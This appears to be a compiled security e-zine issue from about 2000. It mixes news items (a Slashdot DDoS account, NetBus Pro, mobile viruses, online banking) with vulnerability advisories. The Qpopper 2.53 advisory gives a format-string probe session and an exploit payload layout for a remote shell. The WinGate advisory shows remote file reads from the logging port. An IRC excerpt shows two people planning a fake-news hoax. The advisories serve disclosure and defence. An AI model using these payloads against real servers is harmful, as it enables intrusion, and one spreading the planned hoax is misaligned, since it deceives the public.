      from the from-the-horses-mouth dept.
      What follows this introduction is a rough summary of the crazy hell that 
      we endured with the intermittant DDoS[?] attacks we experienced last 
      Thursday through Saturday. I'm sorry it took this long to put this 
      together and tell you what happened, but as these things go, we were too 
      busy trying to solve the problem to waste time talking about it. Big 
      thanks to Andover.Net's Netops PatL, Martin and Liz, as well as 
      Slashcode-wranglers PatG, Chris, Marc, Kurt and CowboyNeal, plus scoop 
      (from freshmeat) and others who chimed in along the way. Tomorrow is 
      part2: A good description of how the new Slashdot @ Exodus works. 

      What follows is more-or-less Pat "BSD-Pat" Lynch's account of the DDoS... 
      Pat is our super 31337 BSD Junkie sysadmin. He wants everyone to know that 
      the timeline below is little screwy, but things are more or less in 
      sequential order. Things might not be exactly perfect, but hey, what do 
      you expect after 30 hours without sleep? 

      Having moved the day before, none of us were truly familiar with exactly 
      how the new hardware would handle the full burden of being 'slashdot.org'. 
      The cluster (known affectionately as The Matrix) had handled its premiere 
      day with flying colors, but we didn't really have an accurate feel of how 
      things would react. Combine this with a couple of extremely high traffic 
      stories posted on both Thursday and Friday, and it took us a awhile to 
      determine that the problems were external, and not a flaw in some new 
      component in the cluster." 

      The Attacks began Thursday morning. Most of it came in the form of SYN 
      floods, from obvious /16's no less, and some /24's. We didn't have any 
      zombie-killing software or a firewall installed because of certain network 
      topology issues. Later on, a second wave came, this closer to 8 or 9pm and 
      the load balancer (an arrowpoint CS-100) died under the load. 

      The DDoS, as far as I could see, was a lot of SYN and Zero port packets 
      coming from various /16's and /24's as well as a bunch of RFC1918 reserved 
      addresses (10.0.0.0/8, 172.16.0.0/12 and 192.168.0.0/16) At one point we 
      reached 109Mbits worth of traffic into our network. 

      Liz and I went back to Exodus and rebooted the Arrowpoint, then the site 
      seemed "ok" for a bit. By 3 in the morning, Liz decided that the PIX 
      (Cisco's firewall) could simply not do what it was supposed to do, so we 
      went back and started building a FreeBSD box as a bridging firewall. 

      just before we went to plug it in, I tried to ssh into the vpn-gate and 
      noticed that nothing was working right: while the site worked, outgoing 
      traffic and source groups on the Arrowpoint was screwed. As if that wasn't 
      enough, two ports died on it already! 

      At some unknown point (time blurs after 30 hours straight!) Martin and 
      PatG show up (thank the gods!) and they force us to go to sleep, they 
      bring the site up outside the Arrowpoint, while Liz and I watch from a 
      hotel room. 

      As of Friday morning, the site is semi-working, but the adsystem can't be 
      updated, and we have no access to the backend servers. I scream bloody 
      murder to Arrowpoint, who eventually shows up to blame the router: a cisco 
      6509 switch with two RSM/MSFCs. 

      Liz and I do packet dumps and determine it's not the router, the little 
      CS-100 had died the night before, and thats where it all started. The 
      Arrowpoint guy insists we did something to make the Arrowpoint not work 
      (CT: Explicit description of precisely where Liz and and Pat wanted to 
      store the newly deceased Arrowpoint removed to keep things rated PG) By 7 
      the CS-800 CSS is up we're almost done for the day, but we stay to make 
      sure. By 10pm we're exhausted but stable, although we're running 4 servers 
      on a round-robin DNS while the new load balancer waits. 

      Netops (Liz , Martin and I) regroup, and do reintegration of new 
      Arrowpoint CS-800 and installation of a new FreeBSD Firewall box instead 
      of the PIX during Saturday Afternoon. Slashdot returns to normal. 
      Sysadmins get well-deserved sleep. 

      So that was the story. It was a pretty hellish weekend for everyone 
      involved, but thanks again to those that helped get our ducks back in a 
      row. Again, Part #2 to this (which originally was gonna be run last 
      Thursday, but with all this ddos stuff got pushed aside) is a fairly 
      detailed description of the new Slashdot setup at Exodus, complete with 
      all the changes mentioned above. Fun for the whole family if your family 
      is really into clusters of web servers."

222.0 [IND] McAfee considers Netbus pro legitimate tool
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     
      Hacking tool slips through McAfee's net 

      McAfee's VirusScan software will no longer detect intrusion
      by a Trojan Horse-based remote administration tool used by
      hackers because it considers the product legitimate.

      NetBus Pro is a commercial tool made by UltraAccess
      Networks that allows machines to be monitored and files to
      be accessed. But the product is based on the infamous
      Trojan Horse called NetBus and has been used illegally by
      hackers to gain access to systems.

      McAfee used to report when it detected NetBus Pro in a
      network, but last week Network Associates, which publishes
      VirusScan, decided that it would no longer report incidences
      of NetBus Pro intrusions.

      Jack Clark, European product manager for Network
      Associates, said: "McAfee will pick up the NetBus Trojan, but
      the Pro product is a genuine remote access tool."

      He said there is no point alerting network managers
      whenever the tool is used legitimately, adding that the
      weekly update of the drivers for VirusScan would include a fix
      to halt some illegal uses of NetBus Pro.

      "There is a way to hide the code on a user machine," said
      Clark. "The update will detect if someone attempts to hide
      their use of NetBus Pro in another file."

      One of the original authors of the network intrusion tool Back
      Orifice, who is now a consultant for security adviser @Stake,
      said the hacker community has welcomed the news.

      He added that these kinds of decisions were often influenced
      by legal concerns that rival remote access tools might be
      scanned out as viruses involving companies in antitrust
      battles.

      Judd Spence, chief executive of UltraAccess, said there were
      many similar software programs that were not scanned by
      antivirus software.

      One night in the underground...
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Two hackers were bored one night and decided to perpetrate a hoax
      here is an overview of what transpired (Edited)
      
      I was almost pulled into the event as it unfolded, my involvement
      was minimal as i deal with real news not fake news however since
      I am known some people went ahead and assumed I gave the plans my

      [19:07] <MrEreet> doubt it
      [19:07] <MrEreet> real media will try to contact mafiaboy by phone and he will say he knows nothing about it.
      [19:08] <MrEreet> thats my guess anyay

      [19:45] <MrEreet> another thing that would generate media interest is to start discussion about it on various web message boards
      [19:46] <MrEreet> if public shows interest media will pay more attention
      [19:46] <MrEreet> so hit news sites and stuff

225.0 [MM] Power your PC with a potato!      
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Potato-powered computer

      Chips with everything, even potatoes
      By BBC News Online internet reporter Mark
      Ward 

      UK technology enthusiasts have found a way
      to power a computer using potatoes. 

      The computer fans, who run a website called
      Temple ov thee Lemur, decided to build the
      spud server because someone bet them that it
      could not be done. 

      Although science kits that power a digital clock
      off a potato or two are available, few people
      have tried anything larger. 

      Steve Harris, spokesman for the group, said to
      lighten the load on the potato power pack the
      group had first to make a low power version of
      a web server. 

      Surfers limited

      These computers are usually powerful,
      high-memory versions of the PCs people have
      on their desks. But there was no way a bag of
      potatoes would provide enough power for one
      of those, said Mr Harris. 


      For the server the
      group cannibalised an
      old computer
      containing a low-power
      Intel 386 chip. They
      removed everything
      but the central chip
      and its associated
      circuitry. The place of
      the hard disk was
      taken by another
      custom-built chip that
      had the server
      software and the two pages of the website
      permanently "burned" into it. 

      Even this small server needs around 12
      potatoes to power it and the spuds have to be
      changed every couple of days. 

      Each potato generates about half a volt. The
      web pages hosted by the server can be
      browsed but the machine limits the number of
      people that can view it every minute to ensure
      it is not overwhelmed. 

      Limited hardware

      Potatoes can be used as batteries because
      the flesh of the vegetable acts as a very thick
      electrolyte - like the acid in a car battery. 

      When electrodes made of zinc and copper are
      stuck into the potato the electrochemical
      reaction produces a power flow. The salty
      flesh of the potato allows ions to cross from
      one electrode to another. 

      Pictures of the potato-powered server are
      available but Mr Harris said they were taken
      when the system was not switched on. "The
      power connectors were plugged in the wrong
      way round and it would have been fatal to the
      hardware if it had been live," he said. 

      The spud server is the latest in a series of
      attempts by technology fans to get the most
      out of very limited hardware. 

      A Dutch company is making web servers using
      old Commodore 64 computers that were
      popular in the mid-1980s. Several web servers
      are run off old Amiga computers and there is
      even a project to turn hand held computers
      such as the Palm into low volume web servers.

226.0 [MM] Mobile phones fertile for E-bugs
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.newscientist.com/news/news_223928.html
      

     Is your phone infected?

     Mobiles are fertile ground for e-bugs of the
     future 

     IN THE wake of the Love Bug virus attack, computer scientists
     are warning that future viruses aimed at intelligent mobile
     phones and personal digital assistants (PDAs) may be even
     worse. They could record your conversations and forward
     them to others, delete money from "electronic wallets", or
     perhaps rack up huge telephone bills. "These viruses could
     spread rapidly in future," predicts David Chess, an antivirus
     researcher at IBM's T. J. Watson Research Center in Yorktown
     Heights, New York. 
     
     Computer viruses attack devices that are programmable, and
     spread when there is some link between one device and
     another. Early viruses spread mainly via infected discs handed
     from user to user. Today the main avenue of infection is by
     e-mail. 

     "The thing that makes viruses a threat is that we're so well
     connected," says Charles Palmer, a specialist in network
     security and cryptography research at IBM. This suggests
     there is a huge potential for viruses to spread via future
     programmable mobiles. 

     In current and next-generation phones, and in PDAs, designers
     have several ways to prevent virus damage. First, they can
     limit the devices' programmability, leaving them without the
     capacity to run viruses. Current phones already fall into this
     category--but future generations will be much more capable. 

     Another option is to store important programs in read-only
     memory so that a virus cannot overwrite them. "The drawback
     then is that the phone cannot be upgraded," says Edward
     Felton, a computer scientist at the Secure Internet
     Programming Laboratory at Princeton University in New Jersey.
     And this strategy cannot protect data that the user adds, as
     it must be stored in a writable memory. "A virus that changes
     your mom's number to a premium-rate number in Nigeria could
     rack up huge bills," says Palmer. 

     Finally, it is possible to ensure that a phone's built-in programs
     are separate, so that one program cannot start another. If the
     virus cannot dial out, it cannot spread. 

     But researchers say there is huge pressure on cellphone
     designers to add functions, and that this will increase the
     chances of infection. "If somebody sends you a telephone
     number by e-mail, you want to be able to click on that number
     to dial it," says Avi Ruben, a specialist in Internet security at
     the AT&T Laboratories in Florham Park, New Jersey. "I know
     that there are prototypes in development that allow this kind
     of threat," adds Felton. 

     When e-mail attachments can trigger other applications, they
     could dial out, start recording software for personal
     surveillance, or wipe out the contents of files such as
     electronic wallets. 

     However, Charles Davies, chief technology officer for the
     British PDA maker Psion, argues that this scenario is unlikely,
     at least for devices that run the widely used EPOC operating
     system, which he helped to design. "I don't want to seem
     smug or complacent but I just don't see it as a big threat," he
     says.

227.0 [MM] The virtual threat
      ~~~~~~~~~~~~~~~~~~~~~~~
     
      http://www.economist.com/editorial/freeforall/current/index_survey.html          
     
     
      THE most remarkable thing about the effect of the Internet
      on the financial-services sector is not how pervasive it has
      been; it is how limited a transformation it has so far
      wrought. Financial institutions, after all, deal in a
      productmoneythat for many of their customers has
      long been virtual. Bank-account holders are used to the
      notion that their cash is represented by a series of numbers
      on a monthly statement generated by a computer, or by the
      glowing green figures of a cash machine. And they have
      become accustomed to making payments using pieces of
      plastic backed with a clever magnetic strip. The Internet
      might have been designed for the distribution, monitoring
      and management of this ubiquitous electronic commodity. 

      More worryingly for the firms that make their living out of
      arranging financial transactions, the Internet might also have
      been designed to do away with them. Banks and other
      financial firms are intermediaries, standing between lenders
      and borrowers, savers and spenders. For decades, banks
      in rich countries have been fretting about how to cope with
      disintermediation: lenders dealing direct with borrowers
      (as many do already in the capital markets), without using a
      banks balance sheet to add a layer of cost. The Internet
      is, potentially, the greatest force for disintermediation the
      banks have ever had to tackle. Other intermediaries, such
      as retailers, face the same problem. But money, unlike,
      say, an item of clothing, is a commodity that can actually be
      used, transferred and delivered electronically. 

      Samuel Theodore, of Moodys, a credit-rating agency,
      believes the banks are currently undergoing their fourth
      disintermediation. The first involved savings, and the
      growth of mutual funds, specialised pension funds and
      life-insurance policies at the expense of bank deposits; the
      second saw the capital markets take on some of the
      banks traditional role as providers of credit; in the third,
      advances in technology helped to streamline back-office
      operations. Now, in the fourth stage, the distribution of
      banking products is being disintermediated. This process
      has been going on for some years, with the spread of
      automated teller machines (ATMs) and, over the past
      decade or so, telephone banking and PC-based proprietary
      systems; but the Internet hugely enlarges its scope. 

      Spotty youth 
       

      Yet, except for one activity, share-trading, and one part of
      the world, Scandinavia, Internet-based financial retailing is,
      if not in its infancy, then scarcely at puberty. And wholesale
      banking, although it relies heavily on complex electronic
      trading systems and information technology, is still
      conducted mostly on closed proprietary networks. To be
      sure, there are some signs that the disintermediation the
      industry fears may be starting. Internet banks, with their
      low costsand their dot.com habit of paying more
      attention to the acquisition of customers than the turning of
      profitshave drawn deposits away from offline banks in
      some countries. And in the capital markets, bond issues
      and share offerings have been syndicated and distributed
      over the Internet. Some highly rated borrowers have for
      years been borrowing through their own issues of
      commercial paper. The Internet can only enhance the
      appeal of do-it-yourself fund-raising. 

      But these are just the early signs of an upheaval that is
      gathering momentum by the day. There are a number of
      reasons why many online financial services have been slow
      to catch on, and why they can now be expected to
      develop faster. Concerns about the security of Internet
      transactions, a particularly important issue for financial
      dealings, are gradually being eased. Internet use, even in
      the rich world, has been patchy, but is spreading fast. And
      whereas conducting financial transactions online up to now
      has often been clunky and annoying, the technology is
      improving all the time. Those technological advances are
      also liberating the Internet from the confines of the PC (see
      article). 

      Most important, financial institutions themselves, which in
      the past have often resisted change, may now become its
      most ardent promoters. Having invested heavily in their
      own systems, banks were understandably reluctant to
      jettison them for web-based replacements. And adapting
      their own processes for the Internet has often proved
      cumbersome and difficult. Moreover, until recently banks
      faced little pressure from their customers to change what
      were seen as useful but boring services, much the same as
      electricity and gas. But soon, in many countries, customers
      will expect an online service as a matter of course. 

      The banks staff, too, have been reluctant to abandon the
      old ways of doing things. Besides, those old ways have
      often been extremely profitable, so change threatens not
      just working habits, but the bottom line too. Now,
      however, almost every financial firm, from the swankiest
      Wall Street investment bank to the provider of microcredit
      to the very poor, has found that it has no choice but to
      invest in an Internet strategy. And having invested in it, it
      will need to persuade its customers to use it. So in areas
      where the advantages of doing business online may not be
      obvious to the consumernotably in retail bankingthe
      banks may find themselves trying to coax, bribe and bully
      reluctant customers online. 

      The banks conservatism, on which they used to pride
      themselves, has become an embarrassment. It has also
      been spotted by the new breed of Internet entrepreneur
      taking aim at the banks business. The models are firms
      such as E*Trade and Charles Schwab, discount
      stockbrokers that found in the Internet a means of
      challenging even the biggest and most prestigious traditional
      firms. Now commercial and investment banks, fund
      managers and financial advisers are all vying with each
      other to present themselves as Internet-savvy, and boasting
      about their investment in online services. 

      All this has created a strange, contradictory world. Clever
      young things with a bright idea and a few million dollars of
      venture capital behind them talk cheerily of the demise of
      traditional banks. Bill Gates, no less, said six years ago that
      banking is necessary, but banks are not. Now, the story
      goes, they are irredeemably hampered by their legacy
      systemstheir existing management structures, staffing
      levels and computersand by their channel
      conflictsbetween what they do now, and online
      methods of sales and distribution. Their bosses simply do
      not get it. Or, even if they do, their institutions are so
      deeply rooted in the old economy and pre-Internet styles
      of business that there is no point in turning them around. 

      The dinosaurs in the supposedly stuffy offices of these big
      banks and securities firms appear unaware that a meteorite
      may be on its way to obliterate them. On the contrary,
      resolutely upbeat online-service managers, often rather
      self-conscious in their tieless, suitless new-economy
      uniforms, claim they are having the times of their lives.
      Never has technology revealed so many new avenues for
      developing the business. It is, says Denis OLeary, who
      runs Chase Manhattans Chase.com, a golden age. 

      Not least because, in the industrialised West, many firms
      have been making bigger profits than ever. Years of
      economic expansion and bull markets have yielded good
      income from traditional lending, from trading and from
      investment. The only obvious cloud in the sky is that
      banks share prices seem not to reflect this (see chart 1).
      Indeed, in some countries, such as Britain, they imply that
      the market expects banks profits to collapse in the next
      few years. Even the stockmarket seems to believe the
      dot.com wannabes, and rewards them with much richer
      valuations than boring old-economy banks. 

      Still kicking 
       

      And yet this survey will argue that many of the older
      institutions have a good story to tell. The legacy systems
      at which the upstarts scoff have one big virtue: they have
      tended, by and large, to work. Big banks process trillions
      of dollars a day. It is almost inconceivable that they might
      close down for a few hours because some clever Internet
      saboteur has found a way of snarling up their technology
      (as has recently happened to some of the biggest
      websites). Existing banks have customers in numbers that
      newcomers can only dream of, and even unpopular
      incumbents benefit from their customers inertia. 

      The Internet also brings established firms huge
      opportunities as well as threats. To take two important
      examples, it offers ways of cutting costs and of marketing
      products much more efficiently. For years, in America,
      Europe, Japan and elsewhere, the industry has been
      consolidating: bank after bank has been taken over by or
      teamed up with an institution in a complementary line of
      business. Usually, these deals are justified to shareholders
      by the extra returns that can be generated once
      overlapping costs are stripped out. The Internet,
      potentially, offers a way of taking a knife to whole layers of
      costs. Once a customer is convinced to carry out most of
      his transactions online, his account becomes much cheaper
      to administer. 

      The other much-cited benefit of consolidation is
      cross-sellingof insurance policies to bank-account
      holders, for example. Yet so far this has rarely been all that
      successful in practice. The Internet can be a
      precision-guided marketing tool. For example, if you apply
      online for a credit card from NextCard, an American
      Internet operation, you will be offered a choice of three
      charging structures. To qualify for the most favourable, you
      have to transfer a certain outstanding balance from your
      other credit cards. That sum willfancy that!be the
      actual total of your other balances, which NextCard has
      just ascertained online from the credit bureaus. Or, in
      wholesale finance, suppose you are a potential investor in a
      companys initial public offering of shares, and have just
      finished watching the boss boosting his companys
      prospects on Merrill Lynchs online investment-banking
      service. The phone rings. And yes, it is a Merrill Lynch
      salesman who knows you have been watching, and thinks
      that now may be the moment to clinch a sale. 

      But, for banks, each of these pluses comes with a minus.
      Because costs are so much lower for Internet-based
      transactions, the barriers to entry are lower as well, which
      implies that margins will come under pressure. And
      although the Internet makes well-directed sales pitches
      easier, that is hardly compensation for the precariousness
      of online customer relationships. Once your client is on the
      Internet, he is only a mouse-click away from your
      competitor, and more and more financial sites, search
      engines and portals will be pushing competing products at
      him. That, too, will squeeze margins. 

      Viewed from this perspective, for many financial institutions
      the Internet is a double bind. Embrace it, and you may still
      find yourself losing business, or at least seeing profit
      margins dwindle. But ignoring it could be terminal. This
      survey will argue that the pressures for change have
      become irresistible. It concentrates on places where the
      process is most advancedAmerica and Europebut the
      same lessons apply everywhere. Big financial institutions
      are global firms. And on the Internet, change spreads like
      wildfire. The stockmarket with the highest proportion of
      Internet trading is not, as you might think, in New York,
      but in Seoul. 

      To make the challenge for the industry even more daunting,
      the revolution also encompasses the very architecture of
      many of the worlds biggest financial markets. Stock,
      commodity and futures exchanges, clearing and settlement
      systems are also being forced to consolidate and
      modernise, to prepare for the day when financial
      transactions are settled instantaneously. 

      In public, no bank boss these days would admit to anything
      less than whole-hearted enthusiasm for the online
      adventure. In private, however, some still see it as just
      another distribution channel, perhaps less important than
      others, such as the telephone. A few still cling to the dream
      that it is a fad they have to indulge because their
      shareholders seem to like it. Even such non-believers,
      however, are being forced by the market to formulate an
      online strategy. If they are too slow, or get it wrong, the
      consequences for their firms could be deadly. And if they
      still need convincing, they need only look at what has
      happened, in just four years, to stockbroking.

                      Application: Qpopper 2.53 for *NIX
                           Vendor: Qualcomm Incorporated

                         Severity: can give users remote
                                   shell with gid=mail.
                           Author: prizm (prizm@resentment.org)

       * Overview
              Qpopper is the most widely-used server for the POP3 protocol. This allows users to 
              access their mail using any POP3 client.  Qpopper supports the latest standards,
              and includes a large number of optional features.  Qpopper is normally used with
              standard UNIX mail transfer and delivery agents such as sendmail or smail. 
      
      
      
       * The Problem
              Yes, Qpop, again and again... 
              There is a bug in version 2.53 of Qpop that can give you a remote
              shell with gid=mail. Problem is with euidl command which uses user input as 
              format string for pop_msg() function.
              Lets examine following code from Qpop 2.53 source:
              --> pop_uidl.c, around line 150:
               ................
                      sprintf(buffer, "%d %s", msg_id, mp->uidl_str);
                      if (nl = index(buffer, NEWLINE)) *nl = 0;
                      sprintf(buffer, "%s %d %.128s", buffer, mp->length, from_hdr(p, mp));
               !      return (pop_msg (p,POP_SUCCESS, buffer));
                                            ^^^^^^^^^^^^^
               .................
              Function pop_msg() is declared in pop_msg.c as pop_msg(POP *p, int stat,
              const char *format,...), and here we have user-input as format string. Lame. 
              Ok, back to problem, imagine following smtp session:
      
                   MAIL FROM:<hakker@evil.org>
                   200 Ok
                   RCPT TO:<luser@host.withqpop253.com>
                   200 Ok
                   data
                   200 Okey, okey. end with "."
                   Subject: still trust qpop?=/
                   X-UIDL: AAAAAAAAAAAAAAAA
                   From: %p%p%p%p%p%p%p
      
                   test
                   .
                   200 BLABLABLA Ok, message accepted for delivery.
      
                Then, luser connects with his pop account and runs euidl command there:
                      +OK QPOP (version 2.53) at b0f starting. <666.666@b0f>
                      USER luser
                      +OK Password required for luser.
                      PASS secret
                      +OK luser has 3 messages (1644 octets).
                      euidl 3
                      +OK 2 AAAAAAAAAAAAAAAA 530 0xbfbfc9b00x804fd740xbfbfc9b00x2120x8052e5e0xbfbfd1e80x8057028
      
                Yeah, thats from my box with FreeBSD. As you can see, our %p%p%p%p%p%p%p
                where implemented as arguments for vsnprintf() command.
      
       * Exploiting
               Is this possible? Yeah, sure!
               But there are some limits. Qpopper2.53 from FreeBSD ports with patches is 
               much more difficult to exploit than one from linux. It is because freebsd 
               patches change vsprintf() call in pop_msg.c to vsnprintf() call, and there is
               big difference between them. Qpopper with FreeBSD's patches IS exploitable.

              Exploiting QPOP from FreeBSD ports
              ----------------------------------
      
              It is NOT easy, because vsprintf() is replaced with vsnprintf() so we can't
              overflow stack, but we still have control over it (remeber %n?).
              Im not going to post exploit for this because it is really generic, but I
              will explain theory on exploiting qpop with vsNprintf.
              There is an little trick with %n YOu should know. Try to understand why
              folowing code succeeds and prints out 2000, not sizeof(b):
      ---<cut>---
      #include <stdio.h>
      int main(void){
              int s=1; char b[1024]; int q;
              snprintf(b, sizeof(b), "%.2000d%n", 1, &q);
              return printf("%d, overflowed? %s\n", q, (s==1?"NO":"YES"));

              On my box with FreeBSD 3.4 i have:
              2000, overflowed? NO
      
              Hah, first time i expected to see 1024, but YOu know that all is
              unpredictable . So, this little thing will help us a lot.
              Exploiting it:
              a) Find where in stack is located user input.
              b) Compose a message with filed X-UIDL and From:
                      X-UIDL: ppRETARETARETARETA
                      From: <SHELLCODE>%.RETURNd%n@test
              where:
              "pp"                    is for padding (two or three chars)
              "RETA"          is return address pointing to SHELLCODE
              "SHELLCODE"             guess
              "RETURN"                return address
      
              c) Exploit? If you need an exploit that will work on FreeBSD, code it yourself.
      
      
      
       * Vulnerable Versions
              2.53(Others?)
       
      
       * Fix
              You can download Qpopper 3.1 at http://www.eudora.com/freeware/qpop.html#CURRENT which
              is not vulnerable to this problem.
      
              Or you can manually patch it by doing the following: 
      
                At lines 150 and 62 from pop_msg.c, replace:
              - return (pop_msg (p,POP_SUCCESS, buffer));
                to:
              + return (pop_msg (p,POP_SUCCESS, "%s", buffer));

       * Overview
              Wingate is a software for internet sharing and are very common.
      
       * The Problem
            First i want to add, WinGate versions prior to 2.1 allowed Internet access by default.
            But after that version they changed it.
                  In WinGate 3.0 Home there are no way to change it so people can access it from the internet.
            In Wingate 3.0 Standard and Pro you can change this bindings.
            By researching this i have found out that many "in the wild" allow connections from the internet
                  and this problem affect many.
            If not accessable from the internet they are always accessed from the LAN that has it.
            So when connecting to the logfile server on port 8010 i found out that all
            the files in the "root" directory of the installed software can be read remotely.
            Nothing particular interesting besides the wingates administrator history file.
            It contains computer names, usernames and the activity of the users that logged in.
            How this information can be used you can figure out yourself.
            Besides that its a matter of privacy for the users using it that should be taken in mind.
            
            So we just fire our browser away to 
      
            http://server.com:8010/
      
            Now we can just add the file we want to download in this case
      
            http://server.com:8010/history.dbf
      
      
       * Vulnerable Versions
              I have tested the newiest version 3.0.5 on NT4.0.
            But im pretty sure all versions prior to it are vulnerable to the same problem.
      
       * Fix
              Close that stupid port that have always been a problem.

230.0 [b0f] ILOVEYOU Virus analysis and removal
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.digibel.org/~b0f/lamagra/analysis.txt
      
            
                              Analysis of the LOVE-LETTER-FOR-YOU virus/worm
      ------------------------------------------------------------------------------------------------
      
      The virus/worm hit Belgium and the rest of the world on Thursday 15/04/2000. A lot of important 
      companies were struck including banks, factories and my dads work :).That's where I got the 
      little bugger. The virus/worm is a big vbscript that spreads by email (smells like Melissa :)) 
      and infects every script on your computer.
      
      Lifecycle
      ------------------------------------------------------------------------------------------------
      
      All starts by opening an attachment on an email, then the script starts.
      It copies itself into:
      $windir/Win32DLL.vbs ($windir = c:\windows on most windows systems)
      $systemdir/MSKernel32.vbs ($systemdir = c:\windows\system)
      $windir/LOVE-LETTER-FOR-YOU.TXT.vbs
      Next it adds those files in the registry so they auto-start on boot.
      
      After that it changes the default page of internet explorer, that way it downloads an executable
      from a site when IE opens. If the file has already been downloaded it also adds that into the 
      registry and changes the default page to "about:blank".
      
      Then it starts sending emails with the script attached to all the people in your addresslist
      Finally the big mess starts, the virus scans every harddisk and networkdisk for extentions:
              Vbs, vbe, js, jse, css, wsh, sct, hta, vbs, jpg, jpeg
      All files found are overwritten by the virus and when mp2's or mp3's are found it copies itself 
      to a vbs script in the same directory. And when mIRC is found a small mIRC script is created 
      which sends an html page, which tries to infect you using IE, to every user that joins a channel 
      you're in.
      
      executable
      ------------------------------------------------------------------------------------------------
      
      It cracks the share passwords and sends those + ipaddr by email to the creator of this virus
      (I couldn't get this program because the server was shutdown, thanks to G0Dfarter for checking it)
      
      Disinfection
      ------------------------------------------------------------------------------------------------
      
      Open regedit and start deleting the malicious entries
      HKEY_LOCAL_MACHINE\Software\Microsoft\CurrentVersion\Run\MSKernel32
      HKEY_HKEY_LOCAL_MACHINE\Software\Microsoft\CurrentVersion\RunServer\Win32DLL
      HKEY_HKEY_LOCAL_MACHINE\Software\Microsoft\CurrentVersion\Run\WIN_BUGSFIX
      
      Search for WIN-BUGSFIX.exe and remove it. 
      Remove $dirsystem\LOVE-LETTER-FOR-YOU.HTM
      
      Check files with extensions: Vbs, vbe, js, jse, css, wsh, sct, hta, vbs, jpg, jpeg and check for
      infection, if so delete them (and replace them with the original).
      
      If you have mIRC is installed remove the script.ini file.
      Remove all the emails, maybe warn the people in your addresslist so they don't open the attachment.
      
      Prevention
      ------------------------------------------------------------------------------------------------
      
      
      There is only 1 rule in these cases: do NOT open suspicious files
      The number one cause why this virus is so affective is that in windows everything is linked. 
      You can control your entire computer from a simple wordmacro (and worst).
      The best thing to do is turn off all sorts of scripting in windows (if possible).

      Intrusion Detection on Linux
       by David "Del" Elson
       last updated Monday, May 22, 2000 
      
                                                                                                                                                                                            RedHat
      
       Introduction
      
       This article focuses on several host-based intrusion detection systems that are available on Linux. In particular, I will cover some of the basics of installing setting up these packages, how they are useful, and in what circumstances
       they can be used.
      
       Systems Security 101
      
       This article assumes a basic knowledge of systems security. In particular, I will assume that the most basic security measures have already been taken to secure a host against intrusion from the internet. These measures could
       include:
      
            Firewalling, to ensure that access to the various TCP and UDP ports of the system that were not intended for internet access are prevented. For example, a basic set of firewalling rules for a web server would ensure that
            the only TCP/IP access to the machine was on TCP port 80, the port normally used for HTTP access.
      
            Disabling daemons that are not required. For example: A web server normally needs a process running to serve web pages. Processes that are not associated with serving web pages, such as RPC/Portmap services, NFS
            services, X Font Server, DNS name server, and other extraneous and unused applications should be stopped or disabled. On a Red Hat Linux system, this is normally done by using one of the run level editors, for example
            ntsysv or tksysv, to disable the startup of any daemon or service that is not required.
      
            Disabling access to ports that are not required, by editing /etc/inetd.conf. Typically, a system will come pre-installed with access to many ports enabled in the /etc/inetd.conf file. Editing this file to remove or comment out any
            lines that are not required is the most basic system security activity and should be carried out on all systems.
      
       Lines of Defence
      
      
       Illustration 1: Multi Layered Systems Security
      
       In this article, I will discuss a multi-layered approach to systems security. Several security layers can be used independently to provide additional protection in case any of the layers should be breached. An example of a
       multi-layered security system is shown in illustration 1. 
      
       Each layer in the diagram provides additional data protection to the layers above it. For example, the first layer is the firewall. Should an intrusion attempt not be defeated by the firewall, a second layer, the Port Sentry program,
       can provide additional protection.
      
       Further inside the security system are the LIDS and LogCheck programs, that provide additional protection should an intrusion attempt not be intercepted by the Port Sentry program.
      
       Monitoring Incoming Connections
      
       The first layer of protection behind the firewall is a software package that will monitor incoming attempts to connect to the machine. The PortSentry package (http://www.psionic.com/abacus/portsentry/) provides a simple and
       effective method of doing this.
      
       What does PortSentry do?
      
       PortSentry is a program that monitors activity on specific TCP/IP ports. Activity on the ports that are monitored by PortSentry is reported, and one of several options can be taken, including denying further attempts to access to
       your system from the source of the activity. This is an important defence mechanism, because a hacker will typically probe your system for weaknesses ("port scanning") before attempting an intrusion. Detecting the probe or port
       scan, and completely denying further access to your system by a potential hacker, robs that hacker of the ability to follow up on any port scans with a real intrusion attempt.
      
       Installing PortSentry
      
       For users of Red Hat Linux, PortSentry is available in RPM format on the Red Hat contrib FTP site. This site is mirrored in various locations around the world, check at www.redhat.com for the location of your nearest mirror. I
       haven't yet determined the availability of a .deb format package for PortSentry but I am sure there is one out there.
      
       For other Linux systems, installing PortSentry from the source code is relatively simple.
      
       Recommended Configuration
      
       PortSentry runs in a number of modes, including various TCP and UDP stealth modes. The mechanism that I prefer to use for running PortSentry is to bind it to a TCP port that (a) is not in use, and (b) is known in some systems to
       have potential for intrusion attempts. For example, port 143 (imap2), port 111 (portmap) and port 23 (telnet) are TCP ports that I do not use on my internet systems, and my web server was scanned on both of those ports in the
       last 24 hours.
      
       To start PortSentry in basic TCP mode, ensure that your system start-up scripts run this command somewhere:
      
       portsentry -tcp
      
       Also, ensure that the PortSentry config file (portsentry.conf) contains a TCP_PORTS line enabling scanning on the ports that you require.
      
       Response Options
      
       The "Response Options" section of the portsentry.conf file allows you to specify what response that PortSentry will take on detecting unwanted activity. The mechanism that I normally choose is to use ipchains to block further
       access from the source of the activity. This is done by uncommenting the following line in the portsentry.conf file:
      
       KILL_ROUTE="/sbin/ipchains -I input -s $TARGET$ -j DENY -l"
      
       On systems that receive a high level of port scanning activity, removing the "-l" at the end of the above line will prevent logging of further incoming connections, which might be useful to save space in the log files.
      
       Monitoring System Logs
      
       Firewalling systems, and software like PortSentry perform one useful function, in that they monitor and prevent connections coming in to unwanted ports on the system. This can prevent access to a system via a standard
       scan-and-intrude method.
      
       Where a system is required to run a particular service (eg: Apache on a web server, or BIND on a DNS server), and a hacker has uncovered a particular loophole in the service, these programs will unfortunately not achieve the
       result of keeping all intruders out of the system. A system acting as a DNS server that has a vulnerable copy of BIND running on it will eventually be discovered by a hacker that scans a wide range of machines for a single port
       (the DNS port) on each machine, and attempts intrusion against that port only. The firewall and PortSentry will unfortunately see this intrusion attempt as a legitimate access to the system.
      
       LogCheck
      
